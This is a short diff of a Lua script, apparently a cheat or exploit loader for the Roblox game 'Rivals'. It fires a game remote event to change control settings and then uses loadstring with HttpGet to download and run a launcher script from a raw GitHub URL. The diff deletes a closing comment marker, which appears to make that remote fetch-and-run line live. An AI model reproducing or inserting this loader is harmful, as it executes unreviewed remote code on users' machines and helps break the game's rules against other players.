@@ -8,5 +8,4 @@ task.wait(0.3)
 game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Replication"):WaitForChild("Fighter"):WaitForChild("SetControls"):FireServer(WantedDevice)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TwiRwal/ScriptsLua/refs/heads/main/RobloxRivals/Launcher.lua"))()
-]]--
 ```
